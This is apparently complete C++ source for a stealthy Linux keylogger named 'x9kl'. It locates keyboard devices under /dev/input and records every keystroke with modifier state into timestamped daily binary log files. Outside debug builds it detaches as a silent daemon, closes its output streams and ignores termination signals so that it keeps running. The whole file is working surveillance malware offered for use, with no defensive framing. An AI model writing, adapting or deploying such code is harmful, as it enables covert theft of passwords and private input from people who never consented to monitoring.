#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <linux/input.h>
#include <regex.h>
#include <sys/select.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>

#include <csignal>
#include <cstring>
#include <ctime>
#include <fstream>
#include <string>
#include <vector>

#ifdef DEBUG
#define X9KL_DEBUG(...) std::fprintf(stdout, "DEBUG: " __VA_ARGS__)
#define X9KL_ERROR(...) std::fprintf(stderr, "ERROR: " __VA_ARGS__)
#else
#define X9KL_DEBUG(...)
#define X9KL_ERROR(...)
#endif  // DEBUG

struct x9kl_ctx_t {
  bool is_capslock_on;
  bool is_shift_pressed;
  bool is_altgr_pressed;
  uint32_t buffer_cursor;
  std::vector<int> kb_fds;
  std::vector<uint16_t> kb_buffer;
  struct input_event event;

  x9kl_ctx_t() : is_capslock_on{false},
                 is_shift_pressed{false},
                 is_altgr_pressed{false},
                 buffer_cursor{0} {
    memset(&event, 0, sizeof(struct input_event));
  }
};

volatile std::sig_atomic_t must_stop{0};

static void sig_handler(int sig_num) {
  (void)sig_num;

#ifdef DEBUG
  must_stop = 1;
#endif  // DEBUG
}

static std::vector<std::string> get_event_files(void) {
  std::string pattern{"H: Handlers=sysrq kbd.*(event[0-9]{1,2})"};
  std::ifstream file{"/proc/bus/input/devices"};
  std::vector<std::string> content;
  std::string line, event_file;
  regmatch_t match[2];
  regex_t regex;

  regcomp(&regex, pattern.c_str(), REG_EXTENDED);

  while (std::getline(file, line)) {
    if (!regexec(&regex, line.c_str(), 2, match, 0)) {
      event_file.assign(&line[match[1].rm_so],
                        (match[1].rm_eo - match[1].rm_so));
      content.emplace_back(event_file);

      X9KL_DEBUG("keyboard found, event file: '%s'\n", event_file.c_str());
    }
  }

  return content;
}

static std::vector<int> get_keyboard_fds(void) {
  std::vector<int> fds;

  for (auto &event : get_event_files()) {
    int fd = open(std::string("/dev/input/" + event).c_str(), O_RDONLY);

    if (fd > 0) {
      fds.emplace_back(fd);
    }
  }

  return fds;
}

static int initialize_x9kl(x9kl_ctx_t *ctx) {
  X9KL_DEBUG("logs dir: %s\n", LOGS_DIR);

  ctx->kb_fds = get_keyboard_fds();
  if (ctx->kb_fds.empty()) {
    X9KL_ERROR("no keyboards found\n");
    return 1;
  }

  if (mkdir(LOGS_DIR, S_IRWXU | S_IRWXG | S_IRWXO)) {
    if (errno != EEXIST) {
      X9KL_ERROR("fail to create logs dir, error: %s\n", strerror(errno));
      return 1;
    }
  }

  std::signal(SIGINT, sig_handler);
  std::signal(SIGKILL, sig_handler);
  std::signal(SIGTERM, sig_handler);
  std::signal(SIGQUIT, sig_handler);

  return 0;
}

static void destroy_ctx(x9kl_ctx_t *ctx) {
  for (auto &fd : ctx->kb_fds) {
    close(fd);
  }
}

static bool should_add_header(const char *filename) {
  std::ifstream file{filename};

  file.seekg(0, file.end);
  return !file.tellg();
}

static void add_header_info(std::ofstream &file) {
  (void)file;
  // TODO
  //   - write locale=X
  //   - write username=Y
  //   - write host=Z
  //   - write endianess=W
}

static void add_timestamp(const tm *time, std::ofstream &file) {
  std::vector<uint16_t> timestamp;

  timestamp.emplace_back((time->tm_hour << 8) | time->tm_min);
  timestamp.emplace_back((time->tm_sec << 8) | 0xff);

  file.write(reinterpret_cast<const char *>(timestamp.data()),
             timestamp.size() * 2);
}

static void add_data(const std::vector<uint16_t> &data, std::ofstream &file) {
  std::vector<uint16_t> log_entry;

  log_entry.insert(log_entry.end(), data.begin(), data.end());
  file.write(reinterpret_cast<const char *>(log_entry.data()),
             log_entry.size() * 2);
}

static void write_buffer_to_log(const std::vector<uint16_t> &buffer) {
  struct tm *time;
  char filename[PATH_MAX]{0};

  {
    std::time_t raw_time;
    char date[9]{0};

    std::time(&raw_time);
    time = std::localtime(&raw_time);
    std::strftime(date, sizeof(date), "%d%m%Y", time);

    std::snprintf(filename, sizeof(filename), "%s/log_%s", LOGS_DIR, date);
  }

  std::ofstream log_file{filename, std::ios::binary | std::ios::app};

  if (should_add_header(filename)) {
    add_header_info(log_file);
  }

  add_timestamp(time, log_file);
  add_data(buffer, log_file);
}

static void handle_enter(x9kl_ctx_t *ctx) {
  if (!ctx->event.value || ctx->kb_buffer.empty()) {
    return;
  }

  X9KL_DEBUG("handling enter key\n");

  ctx->kb_buffer.insert(ctx->kb_buffer.begin() + ctx->buffer_cursor, KEY_ENTER);

  write_buffer_to_log(ctx->kb_buffer);
  // cleanup
  ctx->kb_buffer.clear();
  ctx->buffer_cursor = 0;
}

static void handle_capslock(x9kl_ctx_t *ctx) {
  if (!ctx->event.value) {
    return;
  }

  X9KL_DEBUG("handling capslock key\n");

  ctx->is_capslock_on = !ctx->is_capslock_on;
}

static void handle_shift(x9kl_ctx_t *ctx) {
  X9KL_DEBUG("handling shift key\n");

  ctx->is_shift_pressed = !ctx->is_shift_pressed;
}

static void handle_altgr(x9kl_ctx_t *ctx) {
  X9KL_DEBUG("handling altgr key\n");

  ctx->is_altgr_pressed = !ctx->is_altgr_pressed;
}

static void handle_delete(x9kl_ctx_t *ctx) {
  if (!ctx->event.value) {
    return;
  }

  X9KL_DEBUG("handling delete key\n");

  if (ctx->buffer_cursor < ctx->kb_buffer.size()) {
    ctx->kb_buffer.erase(ctx->kb_buffer.begin() + ctx->buffer_cursor);
  }
}

static void handle_backspace(x9kl_ctx_t *ctx) {
  if (!ctx->event.value) {
    return;
  }

  X9KL_DEBUG("handling backspace key\n");

  if (!ctx->kb_buffer.empty()) {
    ctx->kb_buffer.erase(ctx->kb_buffer.begin() + (--ctx->buffer_cursor));
  }
}

static void handle_arrow(x9kl_ctx_t *ctx) {
  if (!ctx->event.value) {
    return;
  }

  X9KL_DEBUG("handling arrow key\n");

  ctx->buffer_cursor = (ctx->event.code == KEY_LEFT) ? (ctx->buffer_cursor - 1)
                                                     : (ctx->buffer_cursor + 1);
}

static void handle_ascii_key(x9kl_ctx_t *ctx) {
  if (!ctx->event.value) {
    return;
  }

  X9KL_DEBUG("handling ascii key\n");

  uint8_t flags = (ctx->is_altgr_pressed << 2) | (ctx->is_shift_pressed << 1) |
                  ctx->is_capslock_on;
  uint16_t data = (flags << 8) | ctx->event.code;

  X9KL_DEBUG("flags = %x\n", flags);
  X9KL_DEBUG("code = %d\n", ctx->event.code);
  X9KL_DEBUG("data = %lx\n", data);

  ctx->kb_buffer.insert(ctx->kb_buffer.begin() + ctx->buffer_cursor++, data);
}

static void handle_key(x9kl_ctx_t *ctx) {
  switch (ctx->event.code) {
    case KEY_ENTER:
      handle_enter(ctx);
      break;
    case KEY_BACKSPACE:
      handle_backspace(ctx);
      break;
    case KEY_CAPSLOCK:
      handle_capslock(ctx);
      break;
    case KEY_DELETE:
      handle_delete(ctx);
      break;
    case KEY_RIGHT:
    case KEY_LEFT:
      handle_arrow(ctx);
      break;
    case KEY_LEFTSHIFT:
      handle_shift(ctx);
      break;
    case KEY_RIGHTALT:
      handle_altgr(ctx);
      break;
    default:
      handle_ascii_key(ctx);
      break;
  }
}

static void mainloop(x9kl_ctx_t *ctx) {
  struct input_event ev;
  fd_set rfds;

  while (!must_stop) {
    FD_ZERO(&rfds);

    for (auto &fd : ctx->kb_fds) {
      FD_SET(fd, &rfds);
    }

    int ret = select(*(ctx->kb_fds.end() - 1) + 1, &rfds, nullptr, nullptr,
                     nullptr);

    if (ret == -1) {
      continue;
    }

    for (auto &fd : ctx->kb_fds) {
      if (FD_ISSET(fd, &rfds)) {
        ssize_t n_bytes = read(fd, &ev, sizeof(struct input_event));

        if ((ev.type == EV_KEY) && (n_bytes > 0)) {
          X9KL_DEBUG("event received for key '%d'\n", ev.code);

          ctx->event = ev;
          handle_key(ctx);
        }
      }
    }
  }

  X9KL_DEBUG("finishing mainloop\n");
}

static void run(void) {
  x9kl_ctx_t ctx;

  if (initialize_x9kl(&ctx)) {
    X9KL_ERROR("fail to initialize the context\n");
    std::exit(EXIT_FAILURE);
  }

  mainloop(&ctx);
  destroy_ctx(&ctx);
}

static void run_as_daemon(void) {
  pid_t pid, sid;

  pid = fork();
  if (pid == -1) {
    std::exit(EXIT_FAILURE);
  } else if (pid > 0) {
    std::exit(EXIT_SUCCESS);
  } else {
    umask(0);

    sid = setsid();
    if (sid < 0) {
      std::exit(EXIT_FAILURE);
    }

    chdir("/");

    std::fclose(stdin);
    std::fclose(stdout);
    std::fclose(stderr);

    run();
  }
}

int main(void) {
#ifdef DEBUG
  run();
#else
  run_as_daemon();
#endif  // DEBUG

  std::exit(EXIT_SUCCESS);
}
